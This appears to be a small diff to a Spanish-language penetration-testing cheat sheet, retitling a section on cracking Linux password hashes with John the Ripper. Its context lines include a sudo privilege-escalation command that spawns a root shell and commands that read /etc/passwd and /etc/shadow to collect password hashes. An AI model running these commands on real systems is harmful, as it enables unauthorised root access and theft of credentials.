@@ -848,7 +848,7 @@ second-app:
 --- sudo -u#-1 /bin/bash 
 
 
-++ Crack Linux Hash
+++ Crack Linux Hash (John the Ripper)
 --- ls /etc/
 --- cat /etc/passwd (Muestra el listado de los usuarios e información extra)
 --- sudo cat /etc/shadow (Muestra los hash de las contraseñas de los usuarios)
